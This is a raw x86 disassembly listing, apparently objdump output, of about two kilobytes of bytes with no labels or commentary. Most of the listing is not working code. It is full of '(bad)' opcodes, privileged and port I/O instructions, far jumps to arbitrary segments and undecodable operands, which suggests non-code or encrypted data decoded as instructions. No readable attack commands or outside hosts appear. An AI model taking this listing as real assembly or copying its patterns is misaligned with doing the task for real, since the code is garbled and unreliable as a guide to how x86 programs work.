  418d22:	lods   al,BYTE PTR ds:[esi]
  418d23:	call   0xed564456
  418d28:	test   DWORD PTR [edx+0x1353673a],ebp
  418d2e:	push   0xabce368e
  418d33:	rcr    DWORD PTR [eax-0x4f3f263],cl
  418d39:	out    0xb,al
  418d3b:	cmp    al,bl
  418d3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d3e:	adc    eax,0xe22d1f04
  418d43:	add    DWORD PTR [ebp-0x75],eax
  418d46:	mov    BYTE PTR [ecx-0x67affa32],0xea
  418d4d:	adc    ebx,DWORD PTR [edi-0x16bf6c6f]
  418d53:	pop    ecx
  418d54:	sub    al,0xb0
  418d56:	in     al,0xef
  418d58:	jp     0x418dad
  418d5a:	shr    edi,0xc2
  418d5d:	lock lods ax,WORD PTR ds:[esi]
  418d60:	sbb    DWORD PTR [esi+0x6b02a97b],0x7d
  418d67:	xchg   esi,ebp
  418d69:	cli    
  418d6a:	fstp   QWORD PTR [esi+0x7a]
  418d6d:	inc    ecx
  418d6e:	push   eax
  418d6f:	fisttp QWORD PTR [ebp+0xb]
  418d72:	in     al,dx
  418d73:	ins    BYTE PTR es:[edi],dx
  418d74:	call   0x27c:0x713b03d3
  418d7b:	test   BYTE PTR [esi-0x452e80e7],ah
  418d81:	mov    cl,0x7e
  418d83:	push   eax
  418d84:	or     cl,ch
  418d86:	das    
  418d87:	add    ecx,DWORD PTR [eax-0x4cefbaaf]
  418d8d:	xor    esp,esp
  418d8f:	jmp    0xb118:0x3ec12265
  418d96:	sbb    BYTE PTR [ebx],ah
  418d98:	sar    eax,cl
  418d9a:	dec    ebx
  418d9b:	cdq    
  418d9c:	mov    ch,0x3a
  418d9e:	mov    edx,0x6d83965c
  418da3:	add    DWORD PTR [edx+0x1],eax
  418da6:	imul   ebp,edx,0xffffffd0
  418da9:	mul    ch
  418dab:	jbe    0x418d5b
  418dad:	or     ebx,ebx
  418daf:	int    0x28
  418db1:	pop    esp
  418db2:	or     edi,DWORD PTR [edi-0x3c531541]
  418db8:	sub    BYTE PTR [esi+ecx*8],dl
  418dbb:	and    DWORD PTR [esi+0x259c8ddf],ebp
  418dc1:	fdivr  st,st(2)
  418dc3:	pop    eax
  418dc4:	sbb    dl,BYTE PTR [ebp-0x19ce5153]
  418dca:	dec    ebp
  418dcb:	push   cs
  418dcc:	cmp    bl,0x7
  418dcf:	push   ebp
  418dd0:	(bad)  
  418dd2:	sahf   
  418dd3:	dec    esi
  418dd4:	add    al,0xff
  418dd6:	and    esi,DWORD PTR [edi-0x226be591]
  418ddc:	jne    0x418d92
  418dde:	ss enter 0xcb7,0xba
  418de3:	popa   
  418de4:	cmp    edi,eax
  418de6:	shl    DWORD PTR [edx-0x78],0x69
  418dea:	mov    esp,ss
  418dec:	ins    DWORD PTR es:[edi],dx
  418ded:	pop    ds
  418dee:	inc    ebx
  418def:	dec    ebx
  418df0:	jnp    0x418e6f
  418df2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418df3:	sub    ah,al
  418df5:	cdq    
  418df6:	mov    edi,0x32102488
  418dfb:	or     ebp,DWORD PTR [esi+0x74153752]
  418e01:	xor    DWORD PTR ds:0x9fe6a665,0xffffff8f
  418e08:	test   al,0x56
  418e0a:	fstp   QWORD PTR [eax+0x14946ca3]
  418e10:	es jo  0x418e77
  418e13:	mov    cs,ecx
  418e15:	mov    BYTE PTR [ecx],ch
  418e17:	mov    dh,0x45
  418e19:	adc    eax,0xc2fff501
  418e1e:	enter  0x4b17,0xae
  418e22:	xlat   BYTE PTR ds:[ebx]
  418e23:	(bad)  [eax-0xee2560e]
  418e29:	mov    edx,0xe8514fda
  418e2e:	aas    
  418e2f:	jae    0x418eab
  418e31:	retf   
  418e32:	mov    al,ds:0x8648ee06
  418e37:	mov    ds,WORD PTR [esi+0x6b]
  418e3a:	jo     0x418e0b
  418e3c:	xchg   ebp,eax
  418e3d:	dec    eax
  418e3e:	ror    DWORD PTR [eax],1
  418e40:	cli    
  418e41:	ds leave 
  418e43:	loopne 0x418e66
  418e45:	adc    ebp,ecx
  418e47:	jae    0x418ebe
  418e49:	sbb    eax,0xdf2524b5
  418e4e:	or     DWORD PTR [edi+0x2f],0x62
  418e52:	jns    0x418deb
  418e54:	cmp    dl,dl
  418e56:	xlat   BYTE PTR ds:[ebx]
  418e57:	pop    ds
  418e58:	pop    edi
  418e59:	dec    ebx
  418e5a:	in     eax,dx
  418e5b:	inc    ebp
  418e5c:	test   DWORD PTR [edi],ebp
  418e5e:	mov    ds:0xa11c84b0,al
  418e63:	mov    edi,0x5d820354
  418e68:	mov    cl,0x1a
  418e6a:	pushf  
  418e6b:	mov    cs,WORD PTR [ecx+0x61c74c1e]
  418e71:	cwde   
  418e72:	push   esp
  418e73:	ret    0xff7e
  418e76:	jl     0x418ed9
  418e78:	call   0x2752:0xfc331da5
  418e7f:	in     al,dx
  418e80:	dec    esi
  418e81:	cmp    ch,BYTE PTR [esi]
  418e83:	lods   al,BYTE PTR ds:[esi]
  418e84:	jmp    0x418e1a
  418e86:	sbb    al,0x5a
  418e88:	pop    ebp
  418e89:	push   0x39
  418e8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e8c:	jge    0x418e9b
  418e8e:	xchg   esp,eax
  418e8f:	xor    bh,BYTE PTR [ebp+0x71]
  418e92:	cs jmp 0x99ce07d3
  418e98:	inc    esp
  418e99:	xor    al,0xd7
  418e9b:	fisub  DWORD PTR [esi+eax*8]
  418e9e:	sbb    BYTE PTR [esi-0x285dc660],0xa8
  418ea5:	mov    bh,0xe1
  418ea7:	out    0xc7,al
  418ea9:	int3   
  418eaa:	into   
  418eab:	jo     0x418e55
  418ead:	xor    esi,DWORD PTR [esi+0x6d3cafb3]
  418eb3:	push   ebx
  418eb4:	sti    
  418eb5:	fs jp  0x418ec7
  418eb8:	ficom  WORD PTR [ebx]
  418eba:	fist   DWORD PTR [eax+esi*4-0x13a695aa]
  418ec1:	pop    ecx
  418ec2:	sub    eax,0xa6e9fac8
  418ec7:	push   ds
  418ec8:	call   0xa86ab45b
  418ecd:	fmul   QWORD PTR [edi]
  418ecf:	dec    ebx
  418ed0:	lds    esp,FWORD PTR [edx+0x21]
  418ed3:	test   edx,ecx
  418ed5:	xchg   esi,eax
  418ed6:	int    0x38
  418ed8:	icebp  
  418ed9:	retf   
  418eda:	mov    WORD PTR ds:[ebx+0x354f1bad],es
  418ee1:	cmp    BYTE PTR [ecx-0x751845aa],bh
  418ee7:	popf   
  418ee8:	mov    edx,0x19652c5e
  418eed:	es mov cl,0x61
  418ef0:	stos   BYTE PTR es:[edi],al
  418ef1:	es push ds
  418ef3:	call   0xfaf6:0xc0675981
  418efa:	xchg   ebx,eax
  418efb:	and    al,0x55
  418efd:	neg    bl
  418eff:	in     eax,0x56
  418f01:	cmp    BYTE PTR [ecx+ebx*8-0x57],dh
  418f05:	sbb    al,0x21
  418f07:	add    DWORD PTR [esi+0x2e],esp
  418f0a:	cmp    BYTE PTR [ebx+0x605c3ab3],bh
  418f10:	cld    
  418f11:	lds    edx,FWORD PTR [ebx+edi*4+0x5e]
  418f15:	xchg   ecx,eax
  418f16:	iret   
  418f17:	and    al,0x71
  418f19:	cmp    DWORD PTR [ebp+0x5a17f6cf],eax
  418f1f:	mov    gs,esi
  418f21:	test   BYTE PTR [eax+0x17de2d92],bl
  418f27:	add    bl,BYTE PTR [eax]
  418f29:	dec    BYTE PTR [edi]
  418f2b:	pop    edi
  418f2c:	mov    esp,0xdbab5fa2
  418f31:	mov    esp,DWORD PTR [edi-0x556ba78d]
  418f37:	int3   
  418f38:	jle    0x418ed2
  418f3a:	sbb    DWORD PTR [eax+0x53],esp
  418f3d:	jecxz  0x418f84
  418f3f:	sti    
  418f40:	mov    ch,0xab
  418f42:	xor    eax,0xf6c25324
  418f47:	mov    dl,0xb9
  418f49:	sub    ah,BYTE PTR [edi]
  418f4b:	push   edx
  418f4c:	pop    ebp
  418f4d:	pop    ecx
  418f4e:	push   es
  418f4f:	dec    esi
  418f50:	jl     0x418f0b
  418f52:	push   ebx
  418f53:	fsubr  DWORD PTR [eax]
  418f55:	pop    ss
  418f56:	xchg   esp,eax
  418f57:	jp     0x418f46
  418f59:	and    ebp,DWORD PTR [edi-0x649ba230]
  418f5f:	les    edx,FWORD PTR ds:0xc67844e6
  418f65:	ss aas 
  418f67:	ins    BYTE PTR es:[edi],dx
  418f68:	pop    esi
  418f69:	dec    ebp
  418f6a:	pop    eax
  418f6b:	data16 adc al,0x5f
  418f6e:	jmp    0x1a3c01ae
  418f73:	push   esp
  418f74:	mov    WORD PTR [esi+0x73d28db8],gs
  418f7a:	mov    WORD PTR [esi+0x8e462ee],?
  418f80:	cdq    
  418f81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f82:	rdpmc  
  418f84:	sbb    cl,BYTE PTR [ebp-0x7c]
  418f87:	sar    ecx,1
  418f89:	mov    cl,0x9f
  418f8b:	mov    ds:0xe560b6c1,al
  418f90:	imul   DWORD PTR [esi]
  418f92:	scas   al,BYTE PTR es:[edi]
  418f93:	xor    ch,BYTE PTR [eax-0x8]
  418f96:	dec    esp
  418f97:	and    BYTE PTR [edi],ch
  418f99:	or     DWORD PTR [eax-0x61283345],esi
  418f9f:	popa   
  418fa0:	leave  
  418fa1:	mov    DWORD PTR [ecx],ecx
  418fa3:	xchg   DWORD PTR [ebx],eax
  418fa5:	jns    0x418f80
  418fa7:	xchg   ecx,eax
  418fa8:	mov    ch,0x45
  418faa:	enter  0xf33b,0xe
  418fae:	and    ch,BYTE PTR [ebx+0x42]
  418fb1:	ret    
  418fb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fb3:	push   ebx
  418fb4:	imul   ecx,DWORD PTR [edx],0x53
  418fb7:	mov    al,0x9
  418fb9:	inc    ebx
  418fba:	rol    BYTE PTR [ecx-0x2196b0e2],1
  418fc0:	cmp    DWORD PTR [ebp+0x18],0xffffffb1
  418fc4:	ds push ds
  418fc6:	scas   eax,DWORD PTR es:[edi]
  418fc7:	xchg   ebp,eax
  418fc8:	jmp    0x418fc6
  418fca:	mov    ecx,0xe9a8b0c
  418fcf:	cld    
  418fd0:	shr    BYTE PTR [ebx+0x5],1
  418fd3:	adc    esi,ecx
  418fd5:	push   edi
  418fd6:	xor    DWORD PTR [eax+0x15],edx
  418fd9:	jecxz  0x419004
  418fdb:	int    0x7a
  418fdd:	cmp    ecx,edx
  418fdf:	dec    esi
  418fe0:	jb     0x419042
  418fe2:	and    DWORD PTR ds:0x578e5b9,esi
  418fe8:	push   ebp
  418fe9:	retf   0xee44
  418fec:	sti    
  418fed:	and    eax,0xca7410d9
  418ff2:	clc    
  418ff3:	xlat   BYTE PTR ds:[ebx]
  418ff4:	inc    esi
  418ff5:	sub    bl,ah
  418ff7:	pushf  
  418ff8:	add    dh,al
  418ffa:	or     eax,0xd566e59c
  418fff:	fs add DWORD PTR es:[eax],eax
  419003:	pop    ebp
  419004:	add    BYTE PTR [edi],cl
  419006:	sub    esi,DWORD PTR [ebx+0x55402e80]
  41900c:	mov    ah,0x79
  41900e:	test   ecx,edx
  419010:	inc    eax
  419011:	into   
  419012:	lock push ebp
  419014:	sbb    cl,0x7e
  419017:	sub    al,0x6f
  419019:	xlat   BYTE PTR ds:[ebx]
  41901a:	add    esp,DWORD PTR ds:0xf5259914
  419020:	sub    bh,BYTE PTR [edx+0x44f359a]
  419026:	mov    edx,0x6c60f25d
  41902b:	jae    0x419053
  41902d:	aam    0xaa
  41902f:	test   al,0xba
  419031:	push   eax
  419032:	mov    bl,0x4b
  419034:	jle    0x419007
  419036:	dec    eax
  419037:	fcmove st,st(1)
  419039:	sbb    ebx,esp
  41903b:	nop
  41903c:	das    
  41903d:	(bad)  
  41903e:	fdiv   DWORD PTR [edx]
  419040:	and    esi,DWORD PTR [ebx]
  419042:	mov    fs:0x2a8f4460,al
  419048:	xchg   esi,eax
  419049:	mov    ch,0x29
  41904b:	or     BYTE PTR [ebx],bh
  41904d:	inc    edi
  41904e:	sar    bh,0xd1
  419051:	loopne 0x41902a
  419053:	mov    dh,0x2f
  419055:	mov    edx,0x690b4d81
  41905a:	push   0x723d1faf
  41905f:	pop    ebp
  419060:	popf   
  419061:	xlat   BYTE PTR ds:[ebx]
  419062:	cmp    BYTE PTR [esi],al
  419064:	loop   0x4190ad
  419066:	das    
  419067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419068:	jge    0x419014
  41906a:	push   esi
  41906b:	outs   dx,BYTE PTR ds:[esi]
  41906c:	daa    
  41906d:	test   DWORD PTR [eax+ebx*1+0x7ba2f7a],edx
  419074:	mov    esi,0x495de1c
  419079:	mov    cl,0x64
  41907b:	push   0xffffffaa
  41907d:	sbb    eax,0x7584d664
  419082:	arpl   WORD PTR [edi],sp
  419084:	sar    ecx,0x75
  419087:	sahf   
  419088:	inc    esi
  419089:	adc    al,0xb4
  41908b:	adc    BYTE PTR [ebp+0x391f0488],ch
  419091:	(bad)  
  419093:	call   0x7fad:0x202d2ee3
  41909a:	fbstp  TBYTE PTR [edi-0x19]
  41909d:	mov    esp,esp
  41909f:	cmp    eax,edx
  4190a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190a2:	frstor [edi+ebp*4-0x74c081bb]
  4190a9:	lea    edi,[esi-0x4cb02bdf]
  4190af:	pop    esp
  4190b0:	std    
  4190b1:	(bad)  
  4190b3:	jl     0x419120
  4190b5:	imul   ebx,ebx,0x2d122163
  4190bb:	mov    ds:0x89fec2de,eax
  4190c0:	loope  0x419068
  4190c2:	clc    
  4190c3:	in     eax,dx
  4190c4:	out    dx,eax
  4190c5:	dec    ecx
  4190c6:	cmp    dl,BYTE PTR [eax+edx*4+0x74]
  4190ca:	das    
  4190cb:	adc    BYTE PTR [edx],dh
  4190cd:	xor    BYTE PTR [ebp-0x36],al
  4190d0:	push   edx
  4190d1:	es inc esi
  4190d3:	shl    DWORD PTR [edx-0xe358566],cl
  4190d9:	daa    
  4190da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190db:	mov    edi,0x63e0fc37
  4190e0:	dec    ebx
  4190e1:	adc    al,0xde
  4190e3:	mov    BYTE PTR [esi],bl
  4190e5:	fs sbb eax,0x94f6e885
  4190eb:	xchg   edi,eax
  4190ec:	mov    eax,esi
  4190ee:	mov    ?,WORD PTR [edi+ebp*1-0x45]
  4190f2:	jle    0x4190d5
  4190f4:	sub    eax,0xe0d214e5
  4190f9:	inc    edx
  4190fa:	cdq    
  4190fb:	add    eax,DWORD PTR [edi+0x10ee362f]
  419101:	push   edx
  419102:	xchg   ecx,eax
  419103:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419104:	in     eax,dx
  419105:	std    
  419106:	outs   dx,BYTE PTR ds:[esi]
  419107:	jae    0x419090
  419109:	stos   BYTE PTR es:[edi],al
  41910a:	and    BYTE PTR [esi-0x2fc943ae],ah
  419110:	lods   eax,DWORD PTR ds:[esi]
  419111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419112:	push   0x17
  419114:	imul   edx,eax,0x4b
  419117:	enter  0x3548,0x21
  41911b:	mov    eax,0x34ce6350
  419120:	mov    dh,0x7
  419122:	pusha  
  419123:	and    esp,eax
  419125:	push   edi
  419126:	rol    BYTE PTR [edi-0x70e299e6],0x41
  41912d:	adc    BYTE PTR [ecx-0x4],dl
  419130:	in     eax,dx
  419131:	push   ss
  419132:	push   eax
  419133:	mov    ds:0x89753123,eax
  419138:	fidiv  WORD PTR [si+0x771]
  41913d:	int    0x7b
  41913f:	mov    al,ds:0xe936a1e9
  419144:	loopne 0x41917a
  419146:	mov    edx,0xf80f7f60
  41914b:	inc    edx
  41914c:	outs   dx,DWORD PTR ds:[esi]
  41914d:	popa   
  41914e:	cli    
  41914f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419150:	dec    esi
  419151:	aaa    
  419152:	stos   BYTE PTR es:[edi],al
  419153:	test   BYTE PTR [edx-0x5639b78],0xb8
  41915a:	cmc    
  41915b:	leave  
  41915c:	es mov edi,0x4f8e290c
  419162:	jne    0x41918b
  419164:	sbb    BYTE PTR ds:0x2c8e62f,dl
  41916a:	cwde   
  41916b:	out    dx,eax
  41916c:	xlat   BYTE PTR ds:[ebx]
  41916d:	push   0xffffffe3
  41916f:	push   esp
  419170:	add    ch,BYTE PTR [esi-0x4f56faa4]
  419176:	in     al,dx
  419177:	(bad)  
  419178:	mov    WORD PTR [ebx],gs
  41917a:	pop    ss
  41917b:	cdq    
  41917c:	pop    ecx
  41917d:	add    cl,al
  41917f:	out    dx,al
  419180:	sar    DWORD PTR [eax+0x1530ef5d],cl
  419186:	in     ax,dx
  419188:	pop    edx
  419189:	fsub   st,st(2)
  41918b:	dec    eax
  41918c:	clc    
  41918d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41918e:	ja     0x41912c
  419190:	and    al,0xe7
  419192:	xchg   ebx,eax
  419193:	lods   al,BYTE PTR ds:[esi]
  419194:	dec    ebx
  419195:	ret    0x62bc
  419198:	or     eax,0x5d79199d
  41919d:	adc    eax,0x2c5b19c
  4191a2:	pop    edi
  4191a3:	xor    al,0xfe
  4191a5:	icebp  
  4191a6:	repnz mov ebp,0x6f9260b7
  4191ac:	xor    eax,0x2595d932
  4191b1:	xlat   BYTE PTR ds:[ebx]
  4191b2:	mov    dh,0x63
  4191b4:	(bad)  
  4191b5:	mov    cl,0x6e
  4191b7:	mov    ah,0x19
  4191b9:	dec    esp
  4191ba:	loopne 0x41920e
  4191bc:	retf   
  4191bd:	(bad)  
  4191bf:	jmp    0x892:0x1c9b3d2e
  4191c6:	test   ah,dh
  4191c8:	mov    al,0x96
  4191ca:	add    DWORD PTR [ecx+eiz*1+0x1d],ebp
  4191ce:	sti    
  4191cf:	sbb    BYTE PTR ds:0x1c864835,bl
  4191d5:	div    DWORD PTR [ecx-0x15]
  4191d8:	ins    DWORD PTR es:[edi],dx
  4191d9:	push   ecx
  4191da:	adc    BYTE PTR [eax-0x5f8233f3],0x6e
  4191e1:	xchg   ecx,eax
  4191e2:	cli    
  4191e3:	call   0xad38:0xaf2d1682
  4191ea:	mov    eax,0x58f31e06
  4191ef:	sub    esi,ecx
  4191f1:	sub    esi,DWORD PTR [ecx]
  4191f3:	test   eax,0x56ea02ca
  4191f8:	dec    edi
  4191f9:	push   edi
  4191fa:	or     eax,0x29a2fc69
  4191ff:	and    ecx,DWORD PTR [esp+edi*8]
  419202:	mov    dl,0xc6
  419204:	adc    BYTE PTR [ebx+0x56],ah
  419207:	stc    
  419208:	mov    cl,0x64
  41920a:	je     0x4191ff
  41920c:	(bad)  
  41920d:	push   ss
  41920e:	pop    esp
  41920f:	push   esp
  419210:	pop    esi
  419211:	mov    ecx,0xfcfced17
  419216:	mov    bh,0xf0
  419218:	aaa    
  419219:	or     al,0x46
  41921b:	in     eax,0xe5
  41921d:	mov    ds:0xc0acb30a,al
  419222:	aad    0x4b
  419224:	nop
  419225:	aam    0x5f
  419227:	imul   edx,ebx,0xfd9ec8dc
  41922d:	jp     0x419278
  41922f:	sub    BYTE PTR cs:[edi],al
  419232:	out    dx,al
  419233:	xor    cl,ch
  419235:	lahf   
  419236:	je     0x419225
  419238:	sub    al,0x7e
  41923a:	pop    edx
  41923b:	fs mov edx,0x49ac0591
  419241:	popf   
  419242:	scas   eax,DWORD PTR es:[edi]
  419243:	clc    
  419244:	test   DWORD PTR [ebx],0xfde56a64
  41924a:	pushf  
  41924b:	add    BYTE PTR [edx-0x740550da],dh
  419251:	loop   0x419270
  419253:	mov    bh,0xcc
  419255:	pop    ecx
  419256:	outs   dx,DWORD PTR ds:[esi]
  419257:	mov    bl,0xc3
  419259:	gs mov edi,0x4caf9ec9
  41925f:	push   ecx
  419260:	sbb    esi,DWORD PTR [esp+eax*8]
  419263:	xor    BYTE PTR [esi-0xd],bh
  419266:	push   esp
  419267:	lahf   
  419268:	push   es
  419269:	and    al,0xef
  41926b:	xchg   BYTE PTR [edx],cl
  41926d:	mov    al,ds:0x5ef3983a
  419272:	js     0x4192ed
  419274:	(bad)  
  419275:	cmp    BYTE PTR [esi-0x78844967],bh
  41927b:	cmp    ch,BYTE PTR [eax-0x713e23a9]
  419281:	mov    esi,?
  419283:	or     al,0x60
  419285:	shl    DWORD PTR [eax],1
  419287:	in     eax,dx
  419288:	cmp    eax,0xc1b9a26c
  41928d:	jmp    0x136b:0x460a168c
  419294:	or     BYTE PTR [ecx-0x50ebbd0f],bl
  41929a:	mov    bh,0x87
  41929c:	inc    ebx
  41929d:	jo     0x419317
  41929f:	push   0x30
  4192a1:	pop    eax
  4192a2:	out    dx,al
  4192a3:	stos   BYTE PTR es:[edi],al
  4192a4:	pushw  ds
  4192a6:	scas   eax,DWORD PTR es:[edi]
  4192a7:	sbb    al,cl
  4192a9:	and    BYTE PTR [esi+0x2fc0fbf4],dl
  4192af:	mov    eax,ds:0xed86bf58
  4192b4:	lds    edi,FWORD PTR [eax]
  4192b6:	enter  0xeb91,0x74
  4192ba:	enter  0x4160,0xfc
  4192be:	rcl    esp,1
  4192c0:	out    0xf,eax
  4192c2:	popa   
  4192c3:	xchg   edx,eax
  4192c4:	xor    DWORD PTR [ebx+ebx*4],0x777f1b36
  4192cb:	imul   esp,DWORD PTR [eax-0x17d2cec7],0x26
  4192d2:	ja     0x41934c
  4192d4:	rol    BYTE PTR [ebx],0xa8
  4192d7:	out    dx,eax
  4192d8:	mov    eax,ds:0xe188b64c
  4192dd:	dec    edi
  4192de:	xor    dh,dl
  4192e0:	mov    ds:0xb0825176,al
  4192e5:	loopne 0x419288
  4192e7:	jle    0x4192d5
  4192e9:	cmc    
  4192ea:	stos   DWORD PTR es:[edi],eax
  4192eb:	sbb    al,0x34
  4192ed:	xchg   esi,eax
  4192ee:	cmp    al,0xb0
  4192f0:	mov    esp,0x9b06cbd0
  4192f5:	enter  0x9095,0x9b
  4192f9:	jg     0x4192f9
  4192fb:	repnz mov ebx,0x50ad4563
  419301:	pop    eax
  419302:	or     ebx,DWORD PTR [ebp+0x6b4d7518]
  419308:	cs cmp al,0xc8
  41930b:	icebp  
  41930c:	mov    edi,0xa7304e28
  419311:	lods   eax,DWORD PTR ds:[esi]
  419312:	pop    eax
  419313:	test   al,0x0
  419315:	mov    ds,ebp
  419317:	out    0x22,al
  419319:	mov    esi,0x7ba86661
  41931e:	aam    0x57
  419320:	jne    0x419379
  419322:	add    al,0xbf
  419324:	das    
  419325:	inc    ebx
  419326:	fwait
  419327:	bound  ecx,QWORD PTR [ecx+0x8]
  41932a:	ins    BYTE PTR es:[edi],dx
  41932b:	xchg   BYTE PTR [eax-0x33255b57],cl
  419331:	inc    ebp
  419332:	xchg   edx,eax
  419333:	and    eax,0xba420e6e
  419338:	int    0x91
  41933a:	mov    DWORD PTR [edx+esi*8+0xf],eax
  41933e:	sub    esi,DWORD PTR [eax]
  419340:	mov    ebx,0x45a5dc98
  419345:	imul   esi,DWORD PTR [edx-0x7e],0x877c0d22
  41934c:	cwde   
  41934d:	repnz es test eax,0x1be962fe
  419354:	jmp    0x9db1ed03
  419359:	ret    
  41935a:	mov    cl,0x73
  41935c:	in     eax,0xce
  41935e:	sub    eax,DWORD PTR [edi-0x7e962739]
  419364:	sti    
  419365:	ja     0x4192f7
  419367:	dec    esp
  419368:	mov    edi,0x32e7a75a
  41936d:	sbb    cl,bl
  41936f:	rcl    BYTE PTR [edi+0x44],cl
  419372:	loopne 0x41936f
  419374:	addr16 pop es
  419376:	mov    dh,0xfc
  419378:	jo     0x4193b8
  41937a:	mov    dh,0xd3
  41937c:	push   ebx
  41937d:	sub    edi,ebp
  41937f:	les    ebp,FWORD PTR [ecx+0x4b]
  419382:	retf   
  419383:	loopne 0x4193a5
  419385:	jae    0x419346
  419387:	inc    esp
  419388:	rcr    DWORD PTR [edx+0x34],cl
  41938b:	shl    ah,cl
  41938d:	push   esi
  41938e:	mov    bh,0x2
  419390:	inc    edi
  419391:	rol    BYTE PTR [edx+0x55403972],cl
  419397:	stos   DWORD PTR es:[edi],eax
  419398:	iret   
  419399:	add    eax,0xffffffeb
  41939c:	loop   0x4193be
  41939e:	and    eax,0xa8cd0609
  4193a3:	xchg   DWORD PTR [esi-0x42],esp
  4193a6:	icebp  
  4193a7:	or     dl,BYTE PTR [edi]
  4193a9:	cdq    
  4193aa:	ja     0x419351
  4193ac:	pop    edi
  4193ad:	jb     0x41938b
  4193af:	jmp    FWORD PTR [ebp-0x4b45e3d2]
  4193b5:	loope  0x419406
  4193b7:	adc    BYTE PTR [esi+0x143fc39e],dl
  4193bd:	stc    
  4193be:	push   edx
  4193bf:	dec    ecx
  4193c0:	add    DWORD PTR [ecx+0x9cb259f],edx
  4193c6:	jae    0x41940b
  4193c8:	shl    DWORD PTR [esi-0x16],cl
  4193cb:	jmp    0xb693:0xf51e609
  4193d2:	std    
  4193d3:	xchg   ebx,eax
  4193d4:	inc    ebx
  4193d5:	pop    edi
  4193d6:	inc    edx
  4193d7:	and    al,ch
  4193d9:	xchg   bh,bh
  4193db:	int    0xe3
  4193dd:	xor    ebp,DWORD PTR [esi-0x5e]
  4193e0:	shr    BYTE PTR [esi+0x17],1
  4193e3:	push   esi
  4193e4:	jo     0x4193d9
  4193e6:	mov    eax,ds:0xa13e593b
  4193eb:	jne    0x41939c
  4193ed:	in     al,dx
  4193ee:	addr16 add al,0xb1
  4193f1:	cmp    eax,0xebef4f82
  4193f6:	push   ss
  4193f7:	jne    0x4193c0
  4193f9:	ret    
  4193fa:	add    BYTE PTR ds:0x51e5a78b,0x72
  419401:	mov    ch,0x43
  419403:	push   edx
  419404:	mov    ds:0xdb127d43,eax
  419409:	xchg   esi,eax
  41940a:	outs   dx,DWORD PTR ds:[esi]
  41940b:	(bad)  
  41940c:	out    dx,al
  41940d:	mov    WORD PTR [edx],cs
  41940f:	mov    ch,0x7d
  419411:	fwait
  419412:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419413:	gs stos DWORD PTR es:[edi],eax
  419415:	(bad)
  419418:	outs   dx,BYTE PTR ds:[esi]
  419419:	jmp    0xd064b840
  41941e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41941f:	and    al,0x75
  419421:	jno    0x41944b
  419423:	js     0x4193de
  419425:	shl    DWORD PTR [edx],0x4e
  419428:	mov    ds:0x4335eded,al
  41942d:	in     al,dx
  41942e:	push   esi
  41942f:	pop    eax
  419430:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419431:	fdivr  st,st(3)
  419433:	lea    ebp,[eax-0x44]
  419436:	aad    0xa1
  419438:	sub    al,0x75
  41943a:	ret    0x9c07
  41943d:	push   es
  41943e:	jmp    0x4193dc
  419440:	vpor   xmm5,xmm4,XMMWORD PTR [edi+0x34]
  419445:	sub    DWORD PTR [edi+0x24],edx
  419448:	mov    BYTE PTR [ebx],ah
  41944a:	dec    esp
  41944b:	test   DWORD PTR [esi+0x6b4d8465],esi
  419451:	cs mov dx,0xdc84
  419456:	cmc    
  419457:	xlat   BYTE PTR ds:[ebx]
  419458:	mov    cl,0x52
  41945a:	and    BYTE PTR [ecx-0x5d],0x30
  41945e:	(bad)  
  41945f:	fs mov eax,0xc4afc239
  419465:	cmp    al,0xc1
  419467:	sahf   
  419468:	rcl    esi,0x9e
  41946b:	add    al,0xec
  41946d:	gs inc esi
  41946f:	mov    esp,0x9ed6df3d
  419474:	mov    edx,0x13feaa04
  419479:	xor    eax,DWORD PTR [edi+edx*4+0x3b695c20]
  419480:	rol    ch,0xae
  419483:	adc    eax,0x71f3f296
  419488:	gs scas al,BYTE PTR es:[edi]
  41948a:	std    
  41948b:	ret    0xab27
  41948e:	sbb    dh,BYTE PTR [eax]
  419490:	jmp    0x60a233a2
  419495:	lds    ecx,FWORD PTR [edi]
  419497:	je     0x419429
  419499:	into   
  41949a:	mov    ebp,0x906514b6
  41949f:	cmp    edi,DWORD PTR [edi]
  4194a1:	test   eax,0x655d0734
  4194a6:	shl    WORD PTR [edi],0x58
  4194aa:	pop    ds
  4194ab:	rcl    DWORD PTR [ebp-0x3a773dc1],0xa1
  4194b2:	fstp   st(4)
  4194b4:	sbb    eax,0xe203a502
  4194b9:	cdq    
  4194ba:	sahf   
  4194bb:	push   ebx
  4194bc:	add    BYTE PTR [ebx+0x10],dh
  4194bf:	inc    edx
  4194c0:	enter  0xd9c1,0x52
  4194c4:	sub    ebp,DWORD PTR [ebp+0x66889ba7]
  4194ca:	inc    esp
  4194cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194cd:	adc    ebx,ebp
  4194cf:	xor    DWORD PTR [esi+esi*2-0x2c],0x6940cebe
  4194d7:	xor    cl,ah
  4194d9:	in     eax,dx
  4194da:	push   0x5d
  4194dc:	dec    ebp
  4194dd:	popf   
  4194de:	call   0x2e8b:0x14c3261f
  4194e5:	lock inc ebx
  4194e7:	jnp    0x419503
  4194e9:	je     0x4194e9
  4194eb:	retf   0x7836
  4194ee:	sahf   
  4194ef:	and    esp,edi
  4194f1:	rol    DWORD PTR [edi+eax*8-0x1d],1
  4194f5:	ret    
  4194f6:	test   BYTE PTR [ebx-0x3d],al
  4194f9:	push   edi
  4194fa:	rcl    DWORD PTR [esi],0xfe
  4194fd:	outs   dx,DWORD PTR ds:[esi]
  4194fe:	inc    ebp
  4194ff:	stos   DWORD PTR es:[edi],eax
  419500:	nop
  419501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419502:	and    al,0x33
